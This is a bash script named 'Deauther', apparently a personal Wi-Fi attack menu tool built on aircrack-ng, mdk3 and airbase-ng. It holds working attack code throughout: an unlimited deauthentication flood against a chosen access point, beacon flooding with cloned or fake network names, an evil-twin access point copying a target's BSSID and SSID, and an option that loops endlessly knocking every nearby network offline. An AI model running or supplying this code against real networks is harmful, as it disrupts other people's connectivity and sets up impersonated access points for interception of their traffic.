#!/bin/bash
#by jeneral @ unit731
while true; do

	credit(){

		biru
		echo "created by client.233444011@cnc0109"
		echo ""
		sleep 3.0
	}


	biru() {
		echo -e "\e[36m"
	}
	kuning() {
		echo -e "\e[33m"
	}
	merah(){
		echo -e "\e[31m"
	}
	banner() {
	clear
	echo -e """\e[31m
 █▀▀▄ █▀▀ █▀▀█ █░░█ ▀▀█▀▀ █░░█ █▀▀ █▀▀█ 
 █░░█ █▀▀ █▄▄█ █░░█ ░░█░░ █▀▀█ █▀▀ █▄▄▀ 
 ▀▀▀░ ▀▀▀ ▀░░▀ ░▀▀▀ ░░▀░░ ▀░░▀ ▀▀▀ ▀░▀▀
 """ 
	}
	banner
	sleep 0.2
	merah
	echo -e "\e[31m[Wi-Fi interfaces]"
	kuning
	iwconfig 2>/dev/null | grep -o "^\w*"
	merah
	echo "[-] ~~~ O P T I O N S ~~~ [-]"
	echo ""
    echo "[1] ~ Monitor Mode
[2] ~ Managed Mode
[3] ~ WiFi Deauther
[4] ~ Fake WiFi (cloner)
[5] ~ Fake WiFi (BUNCH)
[6] ~ EvilTwin Attack 
[7] ~ attack all network
"
    merah
	read -p "Choose Tools: " choice

    merah
    if [ $choice == 1 ]; then
		banner
     	echo "Turn into Monitor MODE"
        list_interfaces() {
            interfaces=($(ls /sys/class/net/))
            
            biru
            echo ""
            for i in "${!interfaces[@]}"; do
                echo "[$i] ${interfaces[i]}"
            done
        }
        
        choose_interface() {
            kuning
            read -p "Choose Wi-Fi: " choice
            if [[ $choice -ge 0 && $choice -lt ${#interfaces[@]} ]]; then
                chosen_interface="${interfaces[choice]}"
                biru
                echo "You chose: $chosen_interface"
                sudo airmon-ng start "$chosen_interface" 1>/dev/null
				merah
                echo "Monitor mode enabled on $chosen_interface"
                echo ""
            else
                echo "Invalid choice."
            fi
        }
        
        list_interfaces
        choose_interface
    elif [ $choice == 2 ]; then
		banner
		merah
        echo "Turn into Monitor MODE"
        list_interfaces() {
            interfaces=($(ls /sys/class/net/))
            
            kuning
            echo""
            for i in "${!interfaces[@]}"; do
                echo "[$i] ${interfaces[i]}"
            done
        }
        
        choose_interface() {
            merah
            read -p "Choose Wi-Fi: " choice
            if [[ $choice -ge 0 && $choice -lt ${#interfaces[@]} ]]; then
                chosen_interface="${interfaces[choice]}"
                biru
                echo "You chose: $chosen_interface"
                sudo airmon-ng stop "$chosen_interface" 1>/dev/null
				merah
                echo "Monitor mode stopped on $chosen_interface"
                echo ""
            else
                echo "Invalid choice."
            fi
        }
        
        list_interfaces
        choose_interface
    elif [ $choice == 3 ]; then
			
			banner
			merah
			echo "WiFi Deauther V.1"
			kuning
       	list_interfaces() {
            interfaces=($(ls /sys/class/net/))
            
          
            for i in "${!interfaces[@]}"; do
                echo "[$i] ${interfaces[i]}"
            done
        }
        
        choose_interface() {
        	
            merah
            read -p "Choose Interface: " choice
            if [[ $choice -ge 0 && $choice -lt ${#interfaces[@]} ]]; then
                chosen_interface="${interfaces[choice]}"
                biru
                echo "You chose: $chosen_interface"
                echo ""
            else
                echo "Invalid choice."
            fi
        }
        


        
        list_available_wifi() {
        	clear
        	banner
        	merah
        	echo "WiFi Deauther V.1"
			sleep 0.7
			echo "scanning................."
            local output
            output=$(nmcli -t -f SSID,BSSID,CHAN device wifi list | sed 's/\\:/%%/g')
            if [[ $? -eq 0 ]]; then
                IFS=$'\n'
                lines=($output)
                unset IFS
				banner
        		echo "WiFi Deauther V.1"
        		echo""
                echo "Available Wi-Fi networks:"
                kuning
                for i in "${!lines[@]}"; do
                    line="${lines[i]}"
                    ssid=$(echo "$line" | cut -d':' -f1)
                    echo "[$i] SSID: $ssid"
                done
            else
                echo "Error fetching Wi-Fi list."
            fi
        }
        
        choose_wifi() {
            merah
            read -p "Attack Wi-Fi: " choice
            if [[ $choice -ge 0 && $choice -lt ${#lines[@]} ]]; then
                line="${lines[choice]}"
                ssid=$(echo "$line" | cut -d':' -f1)
                bssid=$(echo "$line" | cut -d':' -f2 | sed 's/%%/:/g')
                channel=$(echo "$line" | cut -d':' -f3)
                banner
                merah
                echo "WiFi Deauther V.1"
                kuning
                echo "Targeting Wi-Fi network: 

##############################
 SSID   : $ssid  
 BSSID  : $bssid 
 Channel: $channel
##############################"
                merah
                
                sudo iwconfig "$chosen_interface" channel "$channel" 1>/dev/null
        
               
                sudo aireplay-ng --deauth 0 -a "$bssid" "$chosen_interface" 
            else
                echo "Invalid choice."
            fi
        }
        list_interfaces
        choose_interface
        list_available_wifi
        choose_wifi

    elif [ $choice == "4" ] ; then
	banner


	list_available_wifi() {
		clear
		banner
		merah
		echo "WiFi Deauther V.1"
		sleep 0.7
		echo "scanning................."
		local output
		output=$(nmcli -t -f SSID,BSSID,CHAN device wifi list | sed 's/\\:/%%/g')
		if [[ $? -eq 0 ]]; then
			IFS=$'\n'
			lines=($output)
			unset IFS
			banner
			echo "WiFi Deauther V.1"
			echo ""
			echo "Available Wi-Fi networks:"
			kuning
			for i in "${!lines[@]}"; do
				line="${lines[i]}"
				ssid=$(echo "$line" | cut -d':' -f1)
				echo "[$i] SSID: $ssid"
			done
		else
			echo "Error fetching Wi-Fi list."
		fi
	}

	choose_wifi() {
		merah
		read -p "Attack Wi-Fi: " choice
		if [[ $choice -ge 0 && $choice -lt ${#lines[@]} ]]; then
			line="${lines[choice]}"
			ssid=$(echo "$line" | cut -d':' -f1)
			bssid=$(echo "$line" | cut -d':' -f2 | sed 's/%%/:/g')
			channel=$(echo "$line" | cut -d':' -f3)

			# Generate the list with varying amounts of spaces
			for ((i=1; i<=20; i++)); do
				result_list+=("$ssid$(printf ' %.0s' $(seq 1 $i))")
			done

			# Delete existing wifi.lst file if it exists
		#	if [ -e "wifi.lst" ]; then
		#		rm wifi.lst
		#	fi
			rm -rf ~/wifi.lst
			# Write the result to a new file named "wifi.lst"
			for item in "${result_list[@]}"; do
				echo "$item" >> wifi.lst
			done

			echo "wifi.lst.changed"
			echo "WiFi Cloner v0.2"
			echo "..................."
			echo "cloning [$ssid]"
			sudo mdk3 wlx1cbfcebf2846 b -c 1 -t -f /home/jeneral/wifi.lst
		else
			banner
			merah
			kuning
			echo "Invalid choice. Exiting..."
			sleep 1
		fi
	}


	# Run the functions
	list_available_wifi
	choose_wifi


	elif [ $choice == "5" ]; then
		banner
		echo "Bunch Of Fake AP v1.0"
		echo ""
		
		read -p "Enter Fake SSID: " ssid
		
		# Randomize BSSID
		bssid=$(openssl rand -hex 6 | sed 's/\(..\)/\1:/g; s/.$//')
		
		# Randomize channel between 1 and 9
		channel=$(shuf -i 1-9 -n 1)
		
		# Generate the list with varying amounts of spaces
		result_list=()
		for ((i=1; i<=20; i++)); do
		    result_list+=("$ssid$(printf ' %.0s' $(seq 1 $i))")
		done
		
		# Delete existing wifi.lst file if it exists
		rm -rf ~/wifi.lst
		
		# Write the result to a new file named "wifi.lst"
		for item in "${result_list[@]}"; do
		    echo "$item" >> "$HOME/wifi.lst"
		done
		
		echo "wifi.lst changed"
		echo "Making Fake AP [$ssid]"
		sudo mdk3 wlx1cbfcebf2846 b -c $channel -t -f "$HOME/wifi.lst"

	
	elif [ $choice == "6" ]; then
		banner
		echo "Evil Twin v1.0"		
		echo ""
		interface="wlx1cbfcebf2846"
	
		list_available_wifi() {
		    local output
		    output=$(nmcli -t -f SSID,BSSID,CHAN device wifi list | sed 's/\\:/%%/g')
		    if [[ $? -eq 0 ]]; then
		        IFS=$'\n'
		        lines=($output)
		        unset IFS
	
		        echo "Available Wi-Fi networks:"
		        kuning
		        for i in "${!lines[@]}"; do
	   		         line="${lines[i]}"
	   		         ssid=$(echo "$line" | cut -d':' -f1)
	     	         echo "[$i] SSID: $ssid"
	            done
	  		  else
	    	    echo "Error fetching Wi-Fi list."
	   	   fi
	}
	
	choose_wifi() {
		merah
	    read -p "Clone Wi-Fi: " choice
	    echo ""
	    if [[ $choice -ge 0 && $choice -lt ${#lines[@]} ]]; then
	        line="${lines[choice]}"
	        ssid=$(echo "$line" | cut -d':' -f1)
	        bssid=$(echo "$line" | cut -d':' -f2 | sed 's/%%/:/g')
	        channel=$(echo "$line" | cut -d':' -f3)
	

	        
			banner
			kuning	        
			echo "Cloning [  $ssid  ]"
			merah
	        sudo airbase-ng -a "$bssid" --essid "$ssid" -c "$channel" -z 2 "$interface" 
	        
	    else
	        echo "Invalid choice."
	    fi
	}
	
	list_available_wifi
	choose_wifi

	elif [ $choice == "7" ]; then
		list_interfaces() {
		  interfaces=($(ls /sys/class/net/))
		  
		  banner
		  echo "Available network interfaces:"
		  for i in "${!interfaces[@]}"; do
		    echo "[$i] ${interfaces[i]}"
		  done
		}
		
		# Function to choose a network interface
		choose_interface() {
		  merah
		  read -p "Choose Interface: " choice
		  if [[ $choice -ge 0 && $choice -lt ${#interfaces[@]} ]]; then
		    chosen_interface="${interfaces[choice]}"
		    biru
		    echo "You chose: $chosen_interface"
		    echo ""
		  else
		    merah "Invalid choice."
		    exit 1
		  fi
		}
		
		# Function to list available Wi-Fi networks
		list_available_wifi() {
		  banner
		  merah
		  echo "WiFi Deauther V.1"
		  sleep 0.7
		  echo "Scanning for available Wi-Fi networks..."
		  
		  local output
		  output=$(nmcli -t -f SSID,BSSID,CHAN device wifi list | sed 's/\\:/%%/g')
		  
		  if [[ $? -eq 0 ]]; then
		    IFS=$'\n'
		    lines=($output)
		    unset IFS
		    
		    banner
		    echo "WiFi Deauther V.1"
		    echo ""
		    echo "Available Wi-Fi networks:"
		    kuning
		    for i in "${!lines[@]}"; do
		      line="${lines[i]}"
		      ssid=$(echo "$line" | cut -d':' -f1)
		      echo "[$i] SSID: $ssid"
		    done
		  else
		    echo "Error fetching Wi-Fi list."
		  fi
		}
		
		# Function to perform deauthentication attack on a Wi-Fi network for a short duration
		deauth_attack() {
		  local ssid="$1"
		  local bssid="$2"
		  local channel="$3"
		  
		  banner
		  merah
		  echo "WiFi Deauther V.1"
		  kuning
		  echo "Targeting Wi-Fi network:"
		  echo "##############################"
		  echo " SSID   : $ssid"
		  echo " BSSID  : $bssid"
		  echo " Channel: $channel"
		  echo "##############################"
		  merah
		  
		  sudo iwconfig "$chosen_interface" channel "$channel" 1>/dev/null
		
		  biru
		  echo "Sending deauthentication packets to $ssid (BSSID: $bssid) on channel $channel for 1-2 seconds"
		  
		  sudo aireplay-ng --deauth 1 -a "$bssid" "$chosen_interface"
		  
		  # Sleep for
		}
		
		# Main program
		list_interfaces
		choose_interface
		
		while true; do
		  list_available_wifi
		  
		  for i in "${!lines[@]}"; do
		    line="${lines[i]}"
		    ssid=$(echo "$line" | cut -d':' -f1)
		    bssid=$(echo "$line" | cut -d':' -f2 | sed 's/%%/:/g')
		    channel=$(echo "$line" | cut -d':' -f3)
		    
		    # Launch deauthentication attack for a short duration and move to the next target
		    deauth_attack "$ssid" "$bssid" "$channel"
		  done
		done
		
	
else
	echo "INVALID OPTION"
fi

done
